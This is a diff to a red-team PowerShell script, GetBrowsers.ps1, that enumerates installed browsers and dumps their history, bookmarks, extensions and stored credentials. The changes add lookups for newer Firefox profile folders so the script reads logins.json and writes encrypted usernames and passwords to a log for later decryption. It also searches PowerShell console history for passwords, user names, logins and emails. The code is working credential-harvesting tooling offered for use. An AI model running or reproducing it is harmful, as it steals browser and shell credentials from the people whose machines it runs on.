@@ -8,10 +8,10 @@ Author: r00t-3xp10it (SSA RedTeam @2020)
   PS Script Dev Version: v1.16
 
 .DESCRIPTION
-   Standalone Powershell script to dump Installed browsers information sutch as: HomePage, Browser Version,
+   Standalone Powershell script to dump Installed browsers information sutch as: HomePage, Browsers Version,
    accepted Language, Download Directory, URL History, Bookmarks, Extentions, Start Page, stored creds, etc..
-   The dumps will be Saved into $env:TMP folder. Unless this script 2º argument its used to input another Logfile
-   storage location. If executed with the 2º arg then GetBrowsers will store the logfile in the Input location.
+   The dumps will be Saved into $env:TMP folder and Auto-Deleted in the end. Unless this script 2º argument
+   its used to input the Logfile storage location. In that case GetBrowsers will permanent store the logfile.
 
 .NOTES
    PS C:\> Get-Help ./GetBrowsers.ps1 -full
@@ -23,7 +23,7 @@ Author: r00t-3xp10it (SSA RedTeam @2020)
 
 .EXAMPLE
    PS C:\> ./GetBrowsers.ps1 -RECON
-   Fast Recon (Browsers and versions only)
+   Fast Recon (Browsers and Versions Only)
 
 .EXAMPLE
    PS C:\> ./GetBrowsers.ps1 -FIREFOX
@@ -583,10 +583,18 @@ function ADDONS {
 
     ## Retrieve firefox addons
     echo "`n`n[ Firefox ]" >> $LogFilePath\BrowserEnum.log
-    If(-not(Test-Path "$Env:AppData\Mozilla\Firefox\Profiles\*.default\extensions.json")){
-        echo "{None addons found}" >> $LogFilePath\BrowserEnum.log
+    If(-not(Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\extensions.json")){
+        $Bookmarks_Path = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\extensions.json" # (IEFP)
+        If(-not(Test-Path "$Bookmarks_Path")){
+            echo "{None addons found}" >> $LogFilePath\BrowserEnum.log
+        }else{
+            $Bookmarks_Path = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\extensions.json" # (IEFP)
+            $Json = Get-Content "$Bookmarks_Path" -Raw|ConvertFrom-Json|select *
+            $Json.addons|select-object -property defaultLocale|Select-Object -ExpandProperty defaultLocale|Select-Object Name,description >> $LogFilePath\BrowserEnum.log
+        }  
     }else{
-        $Json = Get-Content "$Env:AppData\Mozilla\Firefox\Profiles\*.default\extensions.json" -Raw|ConvertFrom-Json|select *
+        $Bookmarks_Path = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\extensions.json"
+        $Json = Get-Content "$Bookmarks_Path" -Raw|ConvertFrom-Json|select *
         $Json.addons|select-object -property defaultLocale|Select-Object -ExpandProperty defaultLocale|Select-Object Name,description >> $LogFilePath\BrowserEnum.log
     }
 
@@ -619,10 +627,19 @@ function CREDS_DUMP {
     echo "`n`n[ Firefox ]" >> $LogFilePath\BrowserEnum.log
     echo "`ngit clone https://github.com/Unode/firefox_decrypt.git" >> $LogFilePath\BrowserEnum.log
     echo "------------------------------------------------------" >> $LogFilePath\BrowserEnum.log
-    If(-not(Test-Path "$Env:AppData\Mozilla\Firefox\Profiles\*.default\logins.json")){
-        echo "{None Credentials found}" >> $LogFilePath\BrowserEnum.log
+    If(-not(Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\logins.json")){
+        $Bookmarks_Path = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json" # (IEFP)
+        If(-not(Test-Path "$Bookmarks_Path")){
+            echo "{None addons found}" >> $LogFilePath\BrowserEnum.log
+        }else{
+            $Bookmarks_Path = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json" # (IEFP)
+            $Json = Get-Content "$Bookmarks_Path"|ConvertFrom-Json|select *
+            $Json.logins|select-object hostname,encryptedUsername >> $LogFilePath\BrowserEnum.log
+            $Json.logins|select-object hostname,encryptedPassword >> $LogFilePath\BrowserEnum.log
+        }  
     }else{
-        $Json = get-content $Env:AppData\Mozilla\Firefox\Profiles\*.default\logins.json|ConvertFrom-Json|select *
+        $Bookmarks_Path = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\logins.json"
+        $Json = Get-Content "$Bookmarks_Path"|ConvertFrom-Json|select *
         $Json.logins|select-object hostname,encryptedUsername >> $LogFilePath\BrowserEnum.log
         $Json.logins|select-object hostname,encryptedPassword >> $LogFilePath\BrowserEnum.log
     }
@@ -654,8 +671,8 @@ function CREDS_DUMP {
         $Path = "$env:appdata\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
         $Credentials = Get-Content "$Path"|Select-String -pattern "passw","user","login","email"
         If(-not($Credentials) -or $Credentials -eq $null){
-            echo "`n`nCreds in ConsoleHost_history.txt" >> $LogFilePath\BrowserEnum.log
-            echo "--------------------------------" >> $LogFilePath\BrowserEnum.log
+            echo "`n`nCreds in ConsoleHost_history" >> $LogFilePath\BrowserEnum.log
+            echo "----------------------------" >> $LogFilePath\BrowserEnum.log
             echo "{None Credentials found}" >> $LogFilePath\BrowserEnum.log
         }else{
             ## Loop in each string found
